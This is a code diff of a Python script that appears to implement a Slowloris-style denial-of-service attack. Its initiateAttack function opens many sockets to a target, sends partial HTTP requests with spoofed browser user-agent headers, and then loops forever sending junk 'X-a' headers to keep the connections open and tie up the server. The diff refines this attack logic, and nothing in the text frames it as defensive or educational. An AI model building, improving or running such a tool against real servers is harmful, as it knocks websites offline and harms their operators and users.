@@ -2,13 +2,11 @@ import sys
 import socket
 import random
 
-STANDARD_GET_REQUEST = "GET /?{} HTTP/1.1\r\n"
-STANDARD_GET_REQUEST_HEADER = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-                               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
-                               "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
-                               "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
-                               "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
-                               "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
+STANDARD_GET_REQUEST_HEADERS = ["User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
+                               "User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
+                               "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
+                               "User-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
+                               "User-agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
 ]
 SOCKET_CONNECTIONS = []
 
@@ -22,12 +20,15 @@ def initiateAttack(ip, port):
         create_connection(ip, port)
 
     for s in SOCKET_CONNECTIONS:
-        s.send(str.encode(STANDARD_GET_REQUEST.format(random.randint(0, 2000)).encode('utf-8')))
+        s.send(str.encode("GET / HTTP/1.1\r\n"))
+
+        for header in STANDARD_GET_REQUEST_HEADERS:
+            s.send(str.encode("{}\r\n".format(header)))
 
     while True:
         for connection in SOCKET_CONNECTIONS:
             try:
-                connection.send_header("X-a", random.randint(1,2000))
+                connection.send(str.encode("X-a: {}\r\n".format(random.choice(string.ascii_letters))))
             except socket.error:
                 SOCKET_CONNECTIONS.remove(connection)
         
